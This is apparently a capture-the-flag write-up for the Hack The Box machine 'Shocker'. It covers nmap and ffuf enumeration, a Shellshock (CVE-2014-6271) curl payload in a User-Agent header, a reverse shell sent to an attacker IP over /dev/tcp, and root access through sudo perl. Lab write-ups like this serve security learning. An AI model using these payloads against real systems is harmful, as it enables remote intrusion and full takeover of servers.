
![[shocker logo.png]]

nmap scan

```
nmap -sVC 10.129.8.161 -oN scan.txt
```

```
<SNIP>
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
<SNIP>
```

Let's explore the port 80

![Pasted image 20251209131609](Images/Pasted%20image%2020251209131609.png)

Not much to do here, so i tried to FUZZ the directories using **ffuf**.

```
ffuf -c -w `fzf-wordlists` -u "http://10.129.8.161/FUZZ"
```

And i found that there is **/cgi-bin/** but it is forbidden. Let's try to enumerate the scripts inside

```
ffuf -c -w `fzf-wordlists` -e .php,.txt,.pl,.sh,.asp,.aspx,.html,.json,.py,.cfm,.rb,.cgi,.bak,.tar.gz,.tgz,.zip -u "http://10.129.8.161/cgi-bin/FUZZ"
```
And i found the script **user.sh**

After some research on the web, i tried to test the **CVE-2014-6271** called **Shellshock**.

***Breakthrough :***

Since CGI scripts tend to get through HTTP Headers as environnement variable, if the bash version is old, it's possible to inject arbitrary command into them to get an RCE.

If we add `() { :; };` at the beginning of our HTTP header, it will be interpreted as empty function which will be executed by bash.

To test that, we can use a curl command such as this one

```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'id'" http://10.129.8.161/cgi-bin/user.sh
```

![Pasted image 20251209133126](Images/Pasted%20image%2020251209133126.png)

It worked !

So let's get a reverse shell now.

First we start our netcat listener

```
nc -lvnp 443
```
And we execute this payload
```
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'" http://10.129.8.161/cgi-bin/user.sh
```
![Pasted image 20251209133339](Images/Pasted%20image%2020251209133339.png)

And we got a shell on the target. Let's transform it to an interactive shell

```
export TERM=xterm
```
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Press CTRL+Z to background the session

```
stty raw -echo && fg
```
```
reset
```

And we get a stable shell. 
Let's grab the user.txt under `/home/shelly/user.txt` and look for privesc.

## Privileged Escalation

First thing i did was to see which commands i could run using sudo

```
sudo -l
```

```
<SNIP>

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

<SNIP>
```

Knowing that, i headed to https://gtfobins.github.io/ and looked for **perl**.

And i saw that if i ran 

```
sudo perl -e 'exec "/bin/bash";'
```

I could get root immediately. Let's try that

![Pasted image 20251209133859](Images/Pasted%20image%2020251209133859.png)

And i'm root.

I grabbed the root.txt under /root/root.txt and we rooted the machine
